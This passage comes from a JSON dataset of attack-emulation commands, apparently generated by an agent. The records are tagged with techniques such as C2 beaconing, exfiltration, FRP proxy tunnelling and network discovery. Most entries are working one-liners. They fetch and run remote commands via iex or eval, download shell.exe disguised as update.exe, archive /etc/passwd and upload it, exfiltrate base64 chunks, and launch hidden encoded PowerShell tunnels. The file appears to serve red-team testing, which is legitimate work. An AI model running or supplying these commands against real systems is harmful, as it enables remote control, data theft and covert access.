      "command": "certutil.exe -urlcache -f http://192.168.1.100/c2.txt C:\\Windows\\Temp\\c2_data.txt",
      "description": "Uses certutil to download a file over HTTP and cache it locally.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads content from the specified HTTP URL and saves it to the local path. Outputs progress and result status to console.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.521858",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.767,
      "validated": true
    },
    {
      "id": "58081e34-2438-42b0-8bc3-028a07b04c7c",
      "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_name": "Application Layer Protocol - Web Protocols",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.168.1.100/beacon' -Method POST -Body 'status=alive&host=' + $env:COMPUTERNAME -UseBasicParsing\"",
      "description": "Sends a basic beacon to a C2 server using HTTP POST with system info.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Performs an HTTP POST request to the specified URI with a body containing the computer name. No file is written locally unless server responds with content.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.521858",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.767,
      "validated": true
    },
    {
      "id": "658b5bb4-e9bd-4cd8-8af0-499705ec8a85",
      "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_name": "Application Layer Protocol - Web Protocols",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"try { $web = [System.Net.WebClient]::new(); $data = $web.DownloadString('http://192.168.1.100/cmd'); if ($data) { iex $data } } catch { } finally { Remove-Item '$env:TEMP\\debug.log' -ErrorAction SilentlyContinue }\"",
      "description": "Downloads and executes a command string from a remote server using WebClient, simulating dynamic C2 instruction retrieval.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a command string from the specified URL and execute it in the current context. Includes cleanup of a non-critical log file if it exists. Execution of arbitrary code makes this high risk.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.521858",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.767,
      "validated": true
    },
    {
      "id": "fe8cc4e3-1b9e-4890-ab03-5f8b736dd697",
      "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_name": "Application Layer Protocol - Web Protocols",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "curl -X GET 'http://192.168.1.100/beacon' --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' --output /tmp/response.txt",
      "description": "Basic HTTP GET request to a C2 server to simulate beaconing behavior using a spoofed User-Agent.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends a GET request to the specified URL with a forged User-Agent string and saves the response to /tmp/response.txt. No data is exfiltrated. Connection may fail if server is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.350766",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.767,
      "validated": true
    },
    {
      "id": "83a36ca0-f491-4480-a20f-088373fdfb11",
      "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_name": "Application Layer Protocol - Web Protocols",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "echo 'hostname: $(hostname), user: $(whoami)' | curl -X POST --data-binary @- 'https://192.168.1.100/exfil' --header 'Content-Type: text/plain'",
      "description": "Intermediate command that collects basic system info and exfiltrates it via HTTPS POST request.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Gathers hostname and current user, then sends the data in the body of an HTTPS POST request to the C2 endpoint. Uses @- to pass stdin to curl. No sensitive data is collected beyond basic identifiers.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.350766",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.767,
      "validated": true
    },
    {
      "id": "819ea43d-6671-41e3-b64d-374b61c920c2",
      "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_name": "Application Layer Protocol - Web Protocols",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "cmd=$(curl -s 'http://192.168.1.100/cmd' | head -n1); [ -n \"$cmd\" ] && echo \"Executing: $cmd\" && eval \"$cmd\" || echo 'No command received'",
      "description": "Advanced command that retrieves a command from a remote server and executes it locally, simulating interactive C2.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Fetches a single line command from the C2 server, checks if it's non-empty, and executes it using eval. For testing, the retrieved command should be benign (e.g., 'echo test'). This simulates remote command execution over HTTP. No persistent changes are made.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.351794",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.767,
      "validated": true
    },
    {
      "id": "4b9f03b2-b086-4f80-ba47-5a2fa9e3e1cf",
      "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "echo 'test_data_for_exfil' > %TEMP%\\debug_log.txt && certutil.exe -urlcache -f https://192.168.0.123/upload.php PUT %TEMP%\\debug_log.txt && del %TEMP%\\debug_log.txt",
      "description": "Basic exfiltration using certutil to upload a test file to a remote server via HTTP PUT",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a small test file in TEMP, uploads it to the specified URL using certutil, then deletes the local file. Simulates data exfiltration over C2 using common Windows binary.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:38.916924",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.762,
      "validated": true
    },
    {
      "id": "d297f274-3b34-4b00-8536-28da0233f2fc",
      "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "powershell -Command \"$data = 'exfil_marker_$(Get-Date -Format 'yyyyMMddHHmmss')'; $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data)); $null=(Invoke-WebRequest -Uri 'http://192.168.0.123/beacon' -Method POST -Body $enc -Headers @{ 'Content-Type' = 'application/octet-stream' } -ErrorAction SilentlyContinue); Remove-Item '%TEMP%\\exfil_tmp_*' -ErrorAction SilentlyContinue\"",
      "description": "Intermediate: Encode timestamped marker and exfiltrate via POST request using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a base64-encoded test string containing a timestamp, sends it via HTTP POST to a simulated C2 endpoint, and attempts cleanup of temporary files. Uses built-in PowerShell for encoding and exfiltration.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:38.916924",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.762,
      "validated": true
    },
    {
      "id": "23acd31a-7a55-4c87-99ea-83cd730c52e5",
      "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "mkdir %TEMP%\\diag_pack -ErrorAction SilentlyContinue; echo 'diag_data_1' > %TEMP%\\diag_pack\\log1.txt; echo 'diag_data_2' > %TEMP%\\diag_pack\\log2.txt; Compress-Archive -Path %TEMP%\\diag_pack\\* -DestinationPath %TEMP%\\diag_pack.zip -Force; powershell -Command \"$wc = New-Object Net.WebClient; $wc.UploadFile('https://192.168.0.123/upload', 'POST', '%TEMP%\\diag_pack.zip'); Remove-Item '%TEMP%\\diag_pack','*diag_pack.zip' -Recurse -ErrorAction SilentlyContinue\"",
      "description": "Advanced: Package multiple test files into a ZIP archive and exfiltrate using WebClient via HTTPS",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a directory with dummy log files, compresses them into a ZIP archive using Compress-Archive with -Force, uploads the archive via HTTPS POST using .NET WebClient through PowerShell, then removes all created files and directories. Simulates staged exfiltration of collected data.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:38.916924",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.762,
      "validated": true
    },
    {
      "id": "018fc1cd-db8c-40b2-8ccd-b910a979200b",
      "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "curl -X POST -H 'Content-Type: text/plain' --data-binary @<(hostname; date) http://192.168.250.10:8080/exfil",
      "description": "Basic exfiltration: Sends hostname and timestamp to C2 server using curl with process substitution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Collects basic system info (hostname and date) and sends it in a single HTTP POST request to the specified endpoint. Uses no temporary files.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:52:52.161940",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.762,
      "validated": true
    },
    {
      "id": "1168abe5-e15e-42bc-b4e7-fc721a858623",
      "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "mkdir -p $TMPDIR/exfil_data && cp /etc/passwd $TMPDIR/exfil_data/ 2>/dev/null && tar -czf $TMPDIR/data.tar.gz -C $TMPDIR/exfil_data . && curl -X POST -H 'Content-Type: application/gzip' --data-binary @$TMPDIR/data.tar.gz http://192.168.250.10:8080/upload && rm -f $TMPDIR/data.tar.gz && rm -rf $TMPDIR/exfil_data",
      "description": "Intermediate exfiltration: Archives /etc/passwd and sends it via HTTP POST.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Copies /etc/passwd to a temporary directory, compresses it into a tarball, uploads it via curl, then cleans up local artifacts. Minimal footprint with realistic data packaging.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:52:52.162449",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.762,
      "validated": true
    },
    {
      "id": "43eadf5c-8f9e-4b6c-bd09-aa54ca759772",
      "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "temp_dir=$(mktemp -d) && echo 'sensitive_data_placeholder' > \"$temp_dir/file1.txt\" && echo 'more_data_placeholder' > \"$temp_dir/file2.txt\" && tar -czf - -C \"$temp_dir\" . | base64 | split -b 512 - \"$temp_dir/encoded_\" && for part in \"$temp_dir/encoded_\"*; do curl -X POST --data-binary @$part http://192.168.250.10:8080/push --silent -o /dev/null; done && rm -rf \"$temp_dir\"",
      "description": "Advanced exfiltration: Creates fake data, archives, encodes in base64, splits into chunks, and sends each via HTTP POST.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Simulates staged exfiltration: generates dummy files, streams and compresses them, encodes in base64, splits into small chunks, and sends each to C2 endpoint. Mimics advanced data staging and transfer. Cleans up all local traces.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:52:52.162449",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.762,
      "validated": true
    },
    {
      "id": "c048cf5a-6f4f-444f-b55e-4df4dafdd392",
      "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "cmd.exe /c echo [common] > \"%TEMP%\\frp.ini\" && echo server_addr = 198.51.100.10 >> \"%TEMP%\\frp.ini\" && echo server_port = 7000 >> \"%TEMP%\\frp.ini\" && echo token = testtoken >> \"%TEMP%\\frp.ini\" && certutil.exe -urlcache -f http://198.51.100.10/frp.exe \"%TEMP%\\frp.exe\" && start \"\" \"%TEMP%\\frp.exe\" -c \"%TEMP%\\frp.ini\"",
      "description": "Basic FRP proxy setup using built-in tools: creates config, downloads executable (simulated), and starts proxy.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a test config file in %TEMP%, attempts to download frp.exe (will fail without connectivity), and starts it with the config. Runs in background window.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.165714",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "e1d4eee4-c25e-43fa-99e9-938b75e3b947",
      "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "cmd.exe /c mkdir \"%TEMP%\\frp\" -ErrorAction SilentlyContinue 2>nul && echo server_addr = 198.51.100.10 > \"%TEMP%\\frp\\frpc.ini\" && echo server_port = 7000 >> \"%TEMP%\\frp\\frpc.ini\" && echo [web] >> \"%TEMP%\\frp\\frpc.ini\" && echo type = tcp >> \"%TEMP%\\frp\\frpc.ini\" && echo local_port = 80 >> \"%TEMP%\\frp\\frpc.ini\" && echo remote_port = 8080 >> \"%TEMP%\\frp\\frpc.ini\" && start \"\" /min \"%TEMP%\\frp\\frp.exe\" -c \"%TEMP%\\frp\\frpc.ini\"",
      "description": "Intermediate FRP setup with subdirectory and service-like tunneling configuration, launched minimized.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a frp subdirectory in %TEMP%, writes a more detailed config for port forwarding, and starts frp minimized. No actual payload is executed.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.165714",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "3cba5e86-78e4-4061-82da-6ae597eece0d",
      "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"try { $config = '[common]\\r\\nserver_addr = 198.51.100.10\\r\\nserver_port = 7000\\r\\ntoken = testtoken'; $path = \"$env:TEMP\\frp_config.ini\"; $config | Out-File -FilePath $path -Encoding ASCII -Force; $cmd = \"\"\"$env:TEMP\\frp.exe\"\"\" -c \"\"\"$path\"\"\"\"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden } catch { }\"",
      "description": "Advanced obfuscated execution: creates config and launches FRP via Base64-encoded PowerShell command.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes a config file, constructs a command to run frp, encodes it in Base64 (UTF-16LE), and executes it hidden. Simulates stealthy proxy deployment.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.165714",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "dd59f347-d6e4-4799-a1f0-399022b5b4a2",
      "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "echo -e '[common]\\nserver_addr = 198.51.100.10:7000\\ntoken = test123' > /tmp/frpc.ini && ./frpc -c /tmp/frpc.ini",
      "description": "Basic FRP client configuration and execution to connect to a C2-controlled FRP server.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a minimal FRP client config in /tmp and starts the client to establish a reverse proxy tunnel to the specified server.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:57:43.759209",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "44cfcd9d-afea-4723-8a4b-5fef9c02fc03",
      "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "nohup ./frpc -c <(echo -e '[common]\\nserver_addr = 198.51.100.10:7000\\ntoken = test123\\n[ssh]\\nlocal_port = 22\\nremote_port = 6000') > /dev/null 2>&1 &",
      "description": "Intermediate FRP setup using process substitution and nohup to run the proxy in the background without writing config to disk.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Starts FRP in the background with an in-memory configuration, tunneling local SSH to a remote port on the C2 server, hiding output and surviving shell logout.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:57:43.759209",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "eb416404-b84a-4346-bb63-73749ffa2603",
      "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_id": "836b2473-68f5-4b06-826f-2aac779b1154",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "mkdir -p $HOME/.config/frp && echo -e '[common]\\nserver_addr = 198.51.100.10:7000\\ntoken = test123\\nlog_file = /dev/null\\nlog_level = error' > $HOME/.config/frp/frpc.ini && chmod 600 $HOME/.config/frp/frpc.ini && nohup ./frpc -c $HOME/.config/frp/frpc.ini > /dev/null 2>&1 &",
      "description": "Advanced FRP deployment with hidden configuration directory, restricted permissions, and silent background execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a hidden FRP configuration in the user's home directory with secure permissions, suppresses logs, and runs the client silently in the background.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:57:43.759209",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "85537044-c8b7-45f8-9781-b70452d4900d",
      "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=8081 connectaddress=127.0.0.2",
      "description": "Sets up a local port proxy from 127.0.0.1:8080 to 127.0.0.2:8081, simulating a single hop in a multi-hop proxy chain using built-in netsh functionality.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Configures a port forwarding rule on the local machine. No data transfer occurs. Requires elevated command prompt. Can be removed with 'netsh interface portproxy delete'.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.864396",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "141b28d1-6638-4b3b-9a60-6b9266a1552d",
      "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://127.0.0.2:8081/test.txt %TEMP%\\test_hop2.txt",
      "description": "Simulates retrieving data from a second-hop proxy endpoint using certutil, a built-in Windows binary, to fetch a file via localhost proxy chain.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to download a file from 127.0.0.2:8081 (simulated proxy hop). Will fail if no service is listening, but demonstrates proxy-chained retrieval attempt using native tooling.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.864396",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "8888395c-96bb-4167-b3a1-267acabe323a",
      "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c netsh interface portproxy add v4tov4 listenport=8081 listenaddress=127.0.0.2 connectport=8082 connectaddress=127.0.0.3' -Verb RunAs\"",
      "description": "Chains a second proxy hop by adding a new netsh portproxy rule from 127.0.0.2:8081 to 127.0.0.3:8082, executed via PowerShell to simulate multi-hop proxy expansion with elevation.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Prompts for elevation and adds a second hop in the proxy chain. Simulates progressive proxy layering. No real traffic flows unless services are bound to these ports.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.864396",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "872a3fa3-37bc-4472-89ab-10b6028f412e",
      "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "ssh -D 1080 user1@proxy1.example.com",
      "description": "Establish a basic SOCKS5 proxy on local port 1080 through a single intermediate host (proxy1).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a local SOCKS proxy on port 1080. Outbound traffic can be routed through proxy1.example.com. No data is exfiltrated by this command alone.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.449807",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "77dfaa90-6915-4a76-9211-b0dd6a22fc80",
      "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "ssh -L 8080:proxy2.example.com:3128 user1@proxy1.example.com",
      "description": "Set up local port forwarding through proxy1 to access a proxy service (e.g., Squid) running on proxy2, creating a two-hop proxy chain.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Forwards local port 8080 to port 3128 on proxy2 via proxy1. Enables tunneling HTTP traffic through two hops. Requires proxy2 to run a proxy service accessible to proxy1.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.449807",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "dfa683be-3926-4d04-abc8-18a76e7d64cb",
      "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_id": "a5c78794-6888-44a9-a461-824e2fa76754",
      "technique_name": "Proxy: Multi-hop Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "ssh -J user1@proxy1.example.com -D 1080 user2@internal.proxy2.example.com",
      "description": "Use SSH's built-in jump host (-J) feature to create a multi-hop SOCKS proxy through proxy1 to an internal system (proxy2), simulating advanced proxy chaining.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Establishes a SOCKS proxy on port 1080 tunneled through proxy1 to internal.proxy2.example.com. Traffic passes through two proxy nodes, increasing obfuscation. Uses OpenSSH 7.3+ syntax.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.449807",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.752,
      "validated": true
    },
    {
      "id": "cbb99134-f205-47a2-9ca6-0d457b47dbd3",
      "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_name": "Remote System Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "cmd.exe /c net view",
      "description": "Enumerates all computers in the current domain or workgroup using NetBIOS name service",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists computer names and resource shares visible on the network via NetBIOS. No changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.475691",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "0f6e50f3-75ec-450f-8544-7851764245a6",
      "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_name": "Remote System Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "cmd.exe /c net session",
      "description": "Lists active sessions on the local system, showing connected remote users and systems",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Displays a list of active sessions from remote systems accessing local shared resources. Fails silently if no sessions exist or if privileges are insufficient.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.475691",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "2f6a2f7e-ab95-48a7-b32d-ac636de00b46",
      "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_name": "Remote System Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"1..254 | ForEach-Object { $ip = '192.168.1.' + $_; (New-Object System.Net.NetworkInformation.Ping).Send($ip,100) | Where-Object { $_.Status -eq 'Success' } | Select-Object -ExpandProperty Address }\"",
      "description": "Performs a basic ICMP ping sweep of the 192.168.1.0/24 network to discover live hosts",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends ping requests to IP addresses 192.168.1.1 through 192.168.1.254 and outputs responsive hosts. Uses built-in .NET classes via PowerShell but does not require admin rights. Safe and limited to a single subnet.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.475691",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "e675583b-e2cb-4f6c-a037-63e5a50422b9",
      "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_name": "Remote System Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "for ip in 192.168.1.{1..254}; do ping -c 1 -W 1 $ip | grep 'bytes from' & done; wait",
      "description": "Basic ping sweep to discover active hosts in the 192.168.1.0/24 network",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends one ICMP echo request to each IP in the 192.168.1.0/24 range and prints responses from live hosts. Runs asynchronously for speed. No persistent changes made.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.200691",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "c0291151-9264-4470-9e80-0a8429f540f5",
      "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_name": "Remote System Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "arp-scan --interface=eth0 --local --ignoredups",
      "description": "Intermediate-level discovery using ARP scanning to list devices on the local network segment",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Uses ARP requests to discover all active IPv4 devices on the local subnet via the eth0 interface. Requires root or CAP_NET_RAW to send raw packets. Outputs MAC and IP addresses of responding hosts.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.200691",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "5c339120-97b5-4ad1-a55a-1a68a84b05a6",
      "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
      "technique_name": "Remote System Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "nmap -sV -p 22,80,443,8080 --open -T4 192.168.1.0/24 -oG $HOME/network-scan-results.txt",
      "description": "Advanced network scan to detect open services (SSH, HTTP, HTTPS) on common ports across the 192.168.1.0/24 subnet",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Performs service version detection on specified ports for all hosts in the subnet. Saves results in grepable format to a file in the user's home directory. May generate moderate network traffic. Requires root for accurate port and service detection.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:39.200691",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "ae09f265-73bc-4cb3-8623-e3f7da3083cc",
      "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/shell.exe %TEMP%\\update.exe",
